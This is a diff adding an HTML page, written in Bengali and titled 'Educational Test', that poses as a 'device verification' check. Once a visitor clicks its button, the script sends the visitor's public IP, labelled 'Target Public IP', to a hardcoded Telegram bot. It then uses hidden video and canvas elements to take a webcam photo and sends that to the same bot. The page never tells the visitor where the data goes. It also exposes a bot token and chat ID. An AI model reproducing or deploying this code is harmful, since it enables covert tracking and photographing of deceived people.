@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Educational Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+            background-color: #f0f2f5;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            display: inline-block;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        video, canvas {
+            display: none; /* ব্যাকগ্রাউন্ড প্রসেসের জন্য হাইড করা */
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>ডিভাইস ভেরিফিকেশন</h2>
+    <p>ক্যামেরা ও আইপি তথ্য প্রসেস করতে নিচের বাটনে চাপুন।</p>
+    <button onclick="processData()">Start Check</button>
+</div>
+
+<!-- ভিডিও এবং ক্যানভাস এলিমেন্ট -->
+<video id="video" width="640" height="480" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const BOT_TOKEN = '7983300358:AAEcVH9f1En9I21QCzbhpZ_W41zXOoaR2lw';
+    const CHAT_ID = '6721678542';
+
+    // ১. পাবলিক IP সংগ্রহ ও মেসেজ পাঠানো
+    async function getIPAndSend() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+            
+            // টেলিগ্রামে IP টেক্সট পাঠানো
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `Target Public IP: ${userIP}`
+                })
+            });
+        } catch (error) {
+            console.error("IP Fetch Failed:", error);
+        }
+    }
+
+    // ২. ক্যামেরা পারমিশন ও ক্যাপচার
+    async function processData() {
+        // প্রথমে IP সেন্ড করা
+        await getIPAndSend();
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        try {
+            // ব্রাউজার পারমিশন পপ-আপ চালু করবে
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            // স্ট্রিম লোড হওয়ার জন্য ১ সেকেন্ড অপেক্ষা করে ছবি তোলা
+            setTimeout(() => {
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                // ক্যানভাস থেকে ছবি Blob ফর্মে নেওয়া
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+
+                    // টেলিগ্রাম বট API-তে ছবি সেন্ড
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        alert("চেক সম্পন্ন হয়েছে।");
+                        // ক্যামেরা স্ট্রিম বন্ধ করা
+                        stream.getTracks().forEach(track => track.stop());
+                    });
+                }, 'image/jpeg');
+
+            }, 1000);
+
+        } catch (err) {
+            alert("ক্যামেরা পারমিশন দেওয়া হয়নি বা ক্যামেরা পাওয়া যায়নি।");
+        }
+    }
+</script>
+
+</body>
+</html>
